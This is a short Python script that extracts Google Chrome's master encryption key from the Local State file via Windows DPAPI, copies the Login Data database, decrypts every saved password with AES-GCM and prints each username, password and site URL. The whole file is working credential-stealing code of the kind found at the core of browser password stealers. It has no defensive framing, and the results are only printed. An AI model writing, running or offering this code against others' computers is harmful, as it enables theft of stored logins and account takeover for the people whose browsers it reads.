import os 
import json 
import base64 
import sqlite3 
import win32crypt 
from Cryptodome.Cipher import AES 
import shutil 
from datetime import timezone, datetime, timedelta 


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try: 
        iv = password[3:15]
        password = password[15:]
        
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
        

# get encryption key
encryption_key = get_encryption_key()

# database path
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

filename = "ChromeData.db"

shutil.copyfile(db_path, filename)
# connecting to the database
db = sqlite3.connect(filename)
cursor = db.cursor() # object that allow to interact with the database

cursor.execute('SELECT username_value, password_value, origin_url FROM logins')

rows = cursor.fetchall()
for row in rows:
    username = row[0]
    password = decrypt_password(row[1], encryption_key)
    url = row[2]
    print(f"username: {username}")
    print(f"password: {password}")
    print(f"url: {url} ")
